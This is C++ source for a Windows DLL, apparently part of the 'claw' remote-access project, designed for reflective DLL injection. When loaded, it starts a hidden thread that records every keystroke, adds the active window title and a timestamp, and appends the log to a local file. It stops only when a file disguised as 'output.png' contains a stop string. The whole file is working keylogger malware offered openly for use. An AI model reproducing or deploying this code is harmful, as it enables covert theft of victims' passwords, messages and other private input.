//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
// https://github.com/quantumcored/claw

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)


/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/


#include "ReflectiveLoader.h"
#include <string>
#include <sstream>
#include <ctime>
#include <fstream>

std::string readFileContents(const char* file){
	std::stringstream stream;
	std::ifstream outfile(file);
	if(outfile.is_open()){
		stream << outfile.rdbuf();
		return stream.str();
	} else {
		return "";
	}
}

std::string WindowStamp()
{
	char title[500];
	char buffer[100] = {0};
	memset(title, '\0', 500);
	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, (LPSTR)title ,500);
	time_t t = time(0); 
	struct tm * now = localtime( & t );
	memset(buffer, '\0', 100);
	strftime (buffer,100,"%Y-%m-%d-%S",now);
	
	return "[ " + std::string(title) + " - " +  std::string(buffer) + " ] ";
}


bool hookShift(){
	if (GetKeyState(VK_LSHIFT) < -120){return true;}
	if (GetKeyState(VK_RSHIFT) < -120){return true;}
	return false;
}

bool capsLock(){
	if (GetKeyState(VK_CAPITAL) == 1){return true;}
	if (GetKeyState(VK_CAPITAL) == -127){return true;}
	return false;
}


int filter(int key){
	if ((key >= 65) && (key <= 90)){
		if( (!hookShift()) && (!capsLock()) ){
			key +=32; 
		}
	}
	else if ((key >= 48) && (key <= 57)){
		if (hookShift()){
			switch(key) {
				case '1' : key = '!'; break;
				case '2' : key = '@'; break;
				case '3' : key = '#'; break;
				case '4' : key = '$'; break;
				case '5' : key = '%'; break;
				case '6' : key = '^'; break;
				case '7' : key = '&'; break;
				case '8' : key = '*'; break;
				case '9' : key = '('; break;
				case '0' : key = ')'; break;
			}
		}
	}
	if (hookShift()){
		if (key == 186){key = ':';}
		else if (key == 187){key = '+';}
		else if (key == 188){key = '<';}
		else if (key == 189){key = '_';}
		else if (key == 190){key = '>';}
		else if (key == 191){key = '?';}
		else if (key == 192){key = '~';}

		else if (key == 219){key = '{';}
		else if (key == 220){key = '|';}
		else if (key == 221){key = '}';}
		else if (key == 222){key = '"';}
	}
   
	else {
		if (key == 186){key = ';';}
		else if (key == 187){key = '=';}
		else if (key == 188){key = ',';}
		else if (key == 189){key = '-';}
		else if (key == 190){key = '.';}
		else if (key == 191){key = '/';}
		else if (key == 192){key = '~';}
		
		else if (key == 219){key = '[';}
		else if (key == 220){key = '\\';}
		else if (key == 221){key = ']';}
		else if (key == 222){key = '\'';}        
	}
	
	return key;
}

void Keylogger()
{
	for (unsigned char c = 1; c < 255; c++) {
		SHORT rv = GetAsyncKeyState(c);
		if (rv & 1) { 
			std::string out = "";
			if (c == 1)
				out = "";
			else if (c == 2)
				out = ""; 
			else if (c == 4)
				out = ""; 
			else if (c == 13)
				out = "\n[RETURN] " + WindowStamp() + "\n";
			else if (c == 16 || c == 17 || c == 18)
				out = "";
			else if (c == 160 || c == 161) 
				out = ""; 
			else if (c == 162 || c == 163) 
				out = "[STRG]";
			else if (c == 164) 
				out = "[ALT]";
			else if (c == 165)
				out = "[ALT GR]";
			else if (c == 8)
				out = "[BACKSPACE]";
			else if (c == 9)
				out = "[TAB]";
			else if (c == 27)
				out = "[ESC]";
			else if (c == 33)
				out = "[PAGE UP]";
			else if (c == 34)
				out = "[PAGE DOWN]";
			else if (c == 35)
				out = "[HOME]";
			else if (c == 36)
				out = "[POS1]";
			else if (c == 37)
				out = "[ARROW LEFT]";
			else if (c == 38)
				out = "[ARROW UP]";
			else if (c == 39)
				out = "[ARROW RIGHT]";
			else if (c == 40)
				out = "[ARROW DOWN]";
			else if (c == 45)
				out = "[INS]";
			else if (c == 46)
				out = "[DEL]";
			else if ((c >= 65 && c <= 90)
				|| (c >= 48 && c <= 57)
				|| c == 32)
				out = filter(c);

			else if (c == 91 || c == 92)
				out = "[WIN]";
			else if (c >= 96 && c <= 105)
				out = "[NUM " + std::to_string(c - 96) + "]";
			else if (c == 106)
				out = "[NUM /]";
			else if (c == 107)
				out = "[NUM +]";
			else if (c == 109)
				out = "[NUM -]";
			else if (c == 110)
				out = "[NUM ,]";
			else if (c >= 112 && c <= 123)
				out = "[F" + std::to_string(c - 111) + "]";
			else if (c == 144)
				out = "[NUM]";
			else if (c == 192)
				out = filter(c);
			else if (c == 222)
				out = filter(c);
			else if (c == 186)
				out = filter(c);
			else if (c == 187)
				out = filter(c);
			else if (c == 188)
				out = filter(c);
			else if (c == 189)
				out = filter(c);
			else if (c == 190)
				out = filter(c);
			else if (c == 191)
				out = filter(c);
			else if (c == 226)
				out = filter(c);

			else
				out = "[KEY \\" + std::to_string(c) + "]";

			if (out != "")
			{
				std::ofstream file;
				file.open("log.log", std::ios_base::app);
				file << out;
				file.close();
			}
		}
	}
}



DWORD WINAPI KEYLOGGER_THREAD()
{
    while(true)
    {
        Sleep(10);
        
        std::string x = readFileContents("output.png");
        if(x.find("KEYLOGSTOP") != std::string::npos){
            break;
        }
            
        Keylogger();
    }
}

extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KEYLOGGER_THREAD, NULL, 0 , NULL);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}